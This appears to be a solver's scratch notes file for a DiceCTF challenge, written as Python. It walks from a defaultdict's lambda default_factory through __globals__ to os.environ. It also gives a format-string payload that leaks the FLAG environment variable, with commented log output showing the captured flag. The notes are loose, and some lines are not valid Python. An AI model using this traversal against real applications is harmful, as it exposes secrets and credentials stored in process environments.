import os
from collections import defaultdict
from dataclasses import dataclass
from typing import Optional

from . import driver

FLAG = os.getenv("FLAG")

# Helper because I'm lazy ;)
class MagicDict(defaultdict):
    def __init__(self, d):
        super().__init__(lambda: None, d)


@dataclass
class RequestRecord:
    time: str
    server: str
    method: str
    url: str
    status: int
    bytes_sent: int
    time_elapsed: float
    remote_addr: str
    user: Optional[str]
    headers: MagicDict

dir(MagicDict(dict()))
dir(MagicDict(dict()).default_factory)
MagicDict(dict()).default_factory.__globals__['os']
MagicDict(dict()).default_factory.__globals__['os'].environ['JAIL_ENV_FLAG']

0.headers.default_factory.__globals__[os].environ

# solution: s.EKpeI3FUz+F3PxaL/2bJZ90Gv73wDlv33I/f823byVE4Kbxwq5E7eUYUZm1STEJFGP+rFgBZzPz+8geJfclmcK1zQxMh21UEAQlyleRyIrvo9+uaFuz7uIncoKkyQ1OgObCZAuYwxz+rRg/E3/I0zmMVk+TXR95nfBG9gRl4piRiYsvEezfLKzuj7ixjD4vPV3T/l3OT9cmunmj66CpwsQ==

# the time, followed by the server name in brackets, then the method, and the 0.headers.default_factory.__globals__[os].environ

# 03/Feb/2023:20:59:59 +0000 [ctf.dicega.ng] GET environ({'PWD': '/app', 'FLAG': 'dice{y0U_Ju5t_G0tTa_AsK_Nic3ly}', 'LC_CTYPE': 'C.UTF-8'})
# 03/Feb/2023:21:00:23 +0000 [dicega.ng] POST environ({'PWD': '/app', 'FLAG': 'dice{y0U_Ju5t_G0tTa_AsK_Nic3ly}', 'LC_CTYPE': 'C.UTF-8'})
# 05/Feb/2023:21:00:01 +0000 [ctf.dicega.ng] POST environ({'PWD': '/app', 'FLAG': 'dice{y0U_Ju5t_G0tTa_AsK_Nic3ly}', 'LC_CTYPE': 'C.UTF-8'})